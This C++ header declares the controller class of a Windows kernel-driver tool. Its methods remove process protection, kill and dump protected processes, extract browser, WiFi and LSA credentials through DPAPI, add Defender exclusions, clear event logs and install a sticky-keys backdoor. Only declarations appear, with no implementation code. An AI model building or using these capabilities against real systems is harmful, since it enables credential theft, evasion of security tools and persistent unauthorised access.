#pragma once

#include "SessionManager.h"
#include "kvcDrv.h"
#include "OffsetFinder.h"
#include "TrustedInstallerIntegrator.h"
#include "Utils.h"
#include <vector>
#include <memory>
#include <optional>
#include <chrono>
#include <unordered_map>

class ReportExporter;

// Core kernel process structures for EPROCESS manipulation
struct ProcessEntry
{
    ULONG_PTR KernelAddress;        // EPROCESS structure address in kernel space
    DWORD Pid;                      // Process identifier
    UCHAR ProtectionLevel;          // PP/PPL/None protection level
    UCHAR SignerType;               // Digital signature authority
    UCHAR SignatureLevel;           // Executable signature verification level
    UCHAR SectionSignatureLevel;    // DLL signature verification level
    std::wstring ProcessName;       // Process executable name
};

struct ProcessMatch
{
    DWORD Pid = 0;
    std::wstring ProcessName;
    ULONG_PTR KernelAddress = 0;
};

// WinSQLite dynamic loading for browser database operations
struct SQLiteAPI
{
    HMODULE hModule = nullptr;
    int (*open_v2)(const char*, void**, int, const char*) = nullptr;
    int (*prepare_v2)(void*, const char*, int, void**, const char**) = nullptr;
    int (*step)(void*) = nullptr;
    const unsigned char* (*column_text)(void*, int) = nullptr;
    const void* (*column_blob)(void*, int) = nullptr;
    int (*column_bytes)(void*, int) = nullptr;
    int (*finalize)(void*) = nullptr;
    int (*close_v2)(void*) = nullptr;
};

// Password extraction result structure for DPAPI operations
struct PasswordResult
{
    std::wstring type;              // Chrome, Edge, WiFi credential type
    std::wstring profile;           // Browser/WiFi profile name
    std::wstring url;               // URL for browser logins
    std::wstring username;          // Login username
    std::wstring password;          // Decrypted password
    std::wstring file;              // Source file path
    std::wstring data;              // Additional data
    std::wstring status;            // DECRYPTED, ENCRYPTED, FAILED
    uintmax_t size = 0;             // Data size in bytes
};

// Registry master key for DPAPI operations
struct RegistryMasterKey
{
    std::wstring keyName;           // Registry key path (DPAPI_SYSTEM, NL$KM, etc.)
    std::vector<BYTE> encryptedData; // Raw encrypted data
    std::vector<BYTE> decryptedData; // Decrypted data
    bool isDecrypted = false;       // Decryption success flag
};

// Main controller class with atomic operation management
class Controller
{
public:
    Controller();
    ~Controller();

    Controller(const Controller&) = delete;
    Controller& operator=(const Controller&) = delete;
    Controller(Controller&&) noexcept = default;
    Controller& operator=(Controller&&) noexcept = default;

    // Memory dumping operations with atomic driver management
    bool DumpProcess(DWORD pid, const std::wstring& outputPath) noexcept;
    bool DumpProcessByName(const std::wstring& processName, const std::wstring& outputPath) noexcept;
	
    // Combined binary processing for kvc.dat
    bool LoadAndSplitCombinedBinaries() noexcept;
    bool WriteExtractedComponents(const std::vector<BYTE>& kvcPassData, 
                                  const std::vector<BYTE>& kvcCryptData) noexcept;

    // Process information operations with driver caching
    bool ListProtectedProcesses() noexcept;
    bool GetProcessProtection(DWORD pid) noexcept;
    bool GetProcessProtectionByName(const std::wstring& processName) noexcept;

    // Process protection manipulation with atomic operations
    bool SetProcessProtection(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    bool ProtectProcess(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    bool UnprotectProcess(DWORD pid) noexcept;

    bool ProtectProcessByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    bool UnprotectProcessByName(const std::wstring& processName) noexcept;
    bool SetProcessProtectionByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;

    // Signer-based batch operations for mass unprotection scenarios 
    bool UnprotectBySigner(const std::wstring& signerName) noexcept;
    bool ListProcessesBySigner(const std::wstring& signerName) noexcept;
	
	// Session state restoration
    bool RestoreProtectionBySigner(const std::wstring& signerName) noexcept;
    bool RestoreAllProtection() noexcept;
    void ShowSessionHistory() noexcept;
	
	bool SetProcessProtection(ULONG_PTR addr, UCHAR protection) noexcept;
	SessionManager m_sessionMgr;	

    bool UnprotectAllProcesses() noexcept;
    bool UnprotectMultipleProcesses(const std::vector<std::wstring>& targets) noexcept;
	
    bool KillMultipleProcesses(const std::vector<DWORD>& pids) noexcept;
	bool KillMultipleTargets(const std::vector<std::wstring>& targets) noexcept;

    // Process termination with driver support
    bool KillProcess(DWORD pid) noexcept;
    bool KillProcessByName(const std::wstring& processName) noexcept;

    // Kernel process access for external operations (ProcessManager)
    std::optional<ULONG_PTR> GetProcessKernelAddress(DWORD pid) noexcept;
    std::optional<UCHAR> GetProcessProtection(ULONG_PTR kernelAddress) noexcept;
    std::vector<ProcessEntry> GetProcessList() noexcept;

    // Self-protection operations for privilege escalation
    bool SelfProtect(const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    std::optional<ProcessMatch> ResolveNameWithoutDriver(const std::wstring& processName) noexcept;

    // DPAPI password extraction with TrustedInstaller
    bool ShowPasswords(const std::wstring& outputPath) noexcept;
    bool ExportBrowserData(const std::wstring& outputPath, const std::wstring& browserType) noexcept;

    // Enhanced system integration with comprehensive Defender exclusion management
    bool RunAsTrustedInstaller(const std::wstring& commandLine);
    bool RunAsTrustedInstallerSilent(const std::wstring& command);
    bool AddContextMenuEntries();
    
    // Legacy exclusion management (backward compatibility)
    bool AddToDefenderExclusions(const std::wstring& customPath = L"");
    bool RemoveFromDefenderExclusions(const std::wstring& customPath = L"");
    
    // Enhanced exclusion management with type specification
    bool AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType type, const std::wstring& value);
    bool RemoveDefenderExclusion(TrustedInstallerIntegrator::ExclusionType type, const std::wstring& value);
    
    // Type-specific exclusion convenience methods
    bool AddExtensionExclusion(const std::wstring& extension);
    bool RemoveExtensionExclusion(const std::wstring& extension);
    bool AddIpAddressExclusion(const std::wstring& ipAddress);
    bool RemoveIpAddressExclusion(const std::wstring& ipAddress);
    bool AddProcessExclusion(const std::wstring& processName);
    bool RemoveProcessExclusion(const std::wstring& processName);
    bool AddPathExclusion(const std::wstring& path);
    bool RemovePathExclusion(const std::wstring& path);
    
    // Event log clearing operations with administrative privileges
    bool ClearSystemEventLogs() noexcept;

    // Legacy driver management for compatibility
    bool InstallDriver() noexcept;
    bool UninstallDriver() noexcept;
    bool StartDriverService() noexcept;
    bool StopDriverService() noexcept;
    bool StartDriverServiceSilent() noexcept;
    std::vector<BYTE> ExtractEncryptedDriver() noexcept;
    std::vector<BYTE> DecryptDriver(const std::vector<BYTE>& encryptedData) noexcept;
	
    // Emergency cleanup for atomic operations
    bool PerformAtomicCleanup() noexcept;

    // Sticky keys backdoor management
    bool InstallStickyKeysBackdoor() noexcept;
    bool RemoveStickyKeysBackdoor() noexcept;

private:
    // Core components
    TrustedInstallerIntegrator m_trustedInstaller;
	std::unique_ptr<kvc> m_rtc;
    std::unique_ptr<OffsetFinder> m_of;
    SQLiteAPI m_sqlite;

    // Privilege and system management
    bool EnablePrivilege(LPCWSTR privilegeName) noexcept;
    bool EnableDebugPrivilege() noexcept;
	
    // Enhanced file writing with TrustedInstaller privileges
    bool WriteFileWithPrivileges(const std::wstring& filePath, const std::vector<BYTE>& data) noexcept;

    // PE splitting with enhanced validation
    bool SplitCombinedPE(const std::vector<BYTE>& combinedData,
                        std::vector<BYTE>& kvcPassData, 
                        std::vector<BYTE>& kvcCryptData) noexcept;

    // Atomic driver operations for stability
    bool ForceRemoveService() noexcept;
    bool EnsureDriverAvailable() noexcept;
    bool IsDriverCurrentlyLoaded() noexcept;
    bool PerformAtomicInit() noexcept;
    bool PerformAtomicInitWithErrorCleanup() noexcept;

    // Silent driver installation
    bool InstallDriverSilently() noexcept;
    bool RegisterDriverServiceSilent(const std::wstring& driverPath) noexcept;
	
	// Driver session management
    bool m_driverSessionActive = false;
    std::chrono::steady_clock::time_point m_lastDriverUsage;
    
    // Session management
    bool BeginDriverSession();
    void EndDriverSession(bool force = false);
    void UpdateDriverUsageTimestamp();
    
    // Cache management
    void RefreshKernelAddressCache();
    std::optional<ULONG_PTR> GetCachedKernelAddress(DWORD pid);
    
    // Internal kill method for batch operations
    bool KillProcessInternal(DWORD pid, bool batchOperation = false) noexcept;
	
    // Kernel address cache for processes
    std::unordered_map<DWORD, ULONG_PTR> m_kernelAddressCache;
    std::chrono::steady_clock::time_point m_cacheTimestamp;
    
    // Process list cache
    std::vector<ProcessEntry> m_cachedProcessList;

    // Internal kernel process management (implementation details)
    std::optional<ULONG_PTR> GetInitialSystemProcessAddress() noexcept;
    
    // Process pattern matching with regex support
    std::vector<ProcessMatch> FindProcessesByName(const std::wstring& pattern) noexcept;
    bool IsPatternMatch(const std::wstring& processName, const std::wstring& pattern) noexcept;

    // Memory dumping with comprehensive protection handling
    bool CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexcept;
    bool SetCurrentProcessProtection(UCHAR protection) noexcept;

    // DPAPI extraction lifecycle
    bool PerformPasswordExtractionInit() noexcept;
    void PerformPasswordExtractionCleanup() noexcept;

    // Registry master key extraction with TrustedInstaller
    bool ExtractRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept;
    bool ExtractLSASecretsViaTrustedInstaller(std::vector<RegistryMasterKey>& masterKeys) noexcept;
    bool ParseRegFileForSecrets(const std::wstring& regFilePath, std::vector<RegistryMasterKey>& masterKeys) noexcept;
    bool ConvertHexStringToBytes(const std::wstring& hexString, std::vector<BYTE>& bytes) noexcept;
    
    // Registry master key processing for enhanced display
    bool ProcessRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept;
    std::string BytesToHexString(const std::vector<BYTE>& bytes) noexcept;

    // Browser password processing with AES-GCM decryption
    bool ProcessBrowserPasswords(const std::vector<RegistryMasterKey>& masterKeys, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;
    bool ProcessSingleBrowser(const std::wstring& browserPath, const std::wstring& browserName, const std::vector<RegistryMasterKey>& masterKeys, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;
    bool ExtractBrowserMasterKey(const std::wstring& browserPath, const std::wstring& browserName, const std::vector<RegistryMasterKey>& masterKeys, std::vector<BYTE>& decryptedKey) noexcept;
    int ProcessLoginDatabase(const std::wstring& loginDataPath, const std::wstring& browserName, const std::wstring& profileName, const std::vector<BYTE>& masterKey, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;

    // WiFi credential extraction via netsh
    bool ExtractWiFiCredentials(std::vector<PasswordResult>& results) noexcept;

    // SQLite database operations
    bool LoadSQLiteLibrary() noexcept;
    void UnloadSQLiteLibrary() noexcept;

    // Cryptographic operations for DPAPI and Chrome AES-GCM
    std::vector<BYTE> Base64Decode(const std::string& encoded) noexcept;
    std::vector<BYTE> DecryptWithDPAPI(const std::vector<BYTE>& encryptedData, const std::vector<RegistryMasterKey>& masterKeys) noexcept;
    std::string DecryptChromeAESGCM(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key) noexcept;

    // Process name resolution with driver-free options
    std::optional<ProcessMatch> ResolveProcessName(const std::wstring& processName) noexcept;
    std::vector<ProcessMatch> FindProcessesByNameWithoutDriver(const std::wstring& pattern) noexcept;
};